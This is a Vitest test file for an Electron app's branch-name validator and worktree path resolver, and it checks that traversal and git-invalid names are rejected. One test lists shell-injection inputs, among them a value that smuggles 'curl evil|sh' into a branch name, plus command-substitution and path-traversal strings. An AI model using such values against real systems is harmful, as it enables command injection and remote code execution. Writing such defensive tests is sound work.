import { describe, it, expect } from 'vitest';
import * as path from 'path';
import { isValidBranchName, resolveWorktreePath } from '../../../electron/utils/worktree-path';

const PROJECT = '/Users/someone/proj';
const ROOT = path.join(PROJECT, '.worktrees');

describe('isValidBranchName', () => {
  it('accepts the branch names people actually use', () => {
    for (const ok of ['main', 'feat/frontend', 'fix-123', 'release/1.5.0', 'a.b.c', 'v2']) {
      expect(isValidBranchName(ok), ok).toBe(true);
    }
  });

  it('refuses traversal, which the old regex allowed', () => {
    // /^[a-zA-Z0-9._\-\/]+$/ admits both '.' and '/', so it admits '..'.
    for (const bad of ['..', '../..', '../../../etc', 'a/../../../tmp', 'x/..']) {
      expect(isValidBranchName(bad), bad).toBe(false);
    }
  });

  it('refuses what git itself refuses', () => {
    for (const bad of ['/leading', 'trailing/', 'trailing.', 'x.lock', 'a//b', 'we@{1}', '-dashfirst']) {
      expect(isValidBranchName(bad), bad).toBe(false);
    }
  });

  it('refuses shell metacharacters, since the name is interpolated into a git command', () => {
    for (const bad of ["x'; curl evil|sh; '", 'a b', 'a;b', 'a$(id)', 'a`id`', 'a|b', 'a&b']) {
      expect(isValidBranchName(bad), bad).toBe(false);
    }
  });

  it('refuses empty and absurd lengths', () => {
    expect(isValidBranchName('')).toBe(false);
    expect(isValidBranchName('a'.repeat(201))).toBe(false);
  });
});

describe('resolveWorktreePath', () => {
  it('resolves a normal branch under the project .worktrees', () => {
    expect(resolveWorktreePath(PROJECT, 'feat/frontend')).toBe(path.join(ROOT, 'feat/frontend'));
  });

  it('returns undefined rather than a path outside the project', () => {
    // This was the bug: path.join(project, '.worktrees', '../../../etc') is
    // '/Users/etc'. fs.existsSync said yes, the caller skipped git entirely and
    // spawned the agent with that as its cwd.
    for (const escape of ['../../../etc', '..', 'a/../../../../tmp']) {
      expect(resolveWorktreePath(PROJECT, escape), escape).toBeUndefined();
    }
  });

  it('every path it does return is inside .worktrees', () => {
    for (const branch of ['main', 'feat/a/b/c', 'x.y']) {
      const resolved = resolveWorktreePath(PROJECT, branch)!;
      expect(resolved.startsWith(ROOT + path.sep)).toBe(true);
    }
  });
});
